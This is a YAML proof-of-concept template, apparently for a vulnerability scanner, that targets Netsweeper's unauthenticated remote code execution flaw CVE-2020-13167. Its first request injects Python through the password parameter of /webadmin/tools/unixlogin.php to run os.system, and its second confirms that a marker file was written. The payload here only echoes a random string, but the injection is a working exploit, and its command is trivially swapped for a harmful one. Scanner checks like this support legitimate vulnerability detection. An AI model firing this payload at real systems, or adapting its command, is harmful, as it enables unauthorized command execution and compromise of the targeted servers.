name: yaml-poc-netsweeper-netsweeper-other-CVE-2020-13167
binding: f5e36f2f-ca19-4c5b-8f68-e8273c00f80e
detail:
    author: system_user
    links:
        - http://www.nsfocus.net/vulndb/48228
        - https://nvd.nist.gov/vuln/detail/CVE-2020-13167
        - https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/
    vulnerability:
        id: 35fcab0b-af17-4da4-8d69-b88930195370
        level: critical
transport: http
set:
    url: request.url.scheme + "://" + request.url.host
    f1: randomLowercase(8)
    f2: string(randomInt(10000, 20000))
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /webadmin/tools/unixlogin.php?login=admin&password=g'%2C'')%3Bimport%20os%3Bos.system('echo%20{{f1}}%20%3E%20log{{f2}}.txt')%23&timeout=5
            headers:
                Referer: '{{url}}/webadmin/admin/service_manager_data.php'
            follow_redirects: false
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: /webadmin/tools/log{{f2}}.txt
            headers:
                Referer: '{{url}}/webadmin/admin/service_manager_data.php'
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(f1))
expression: r0() && r1()
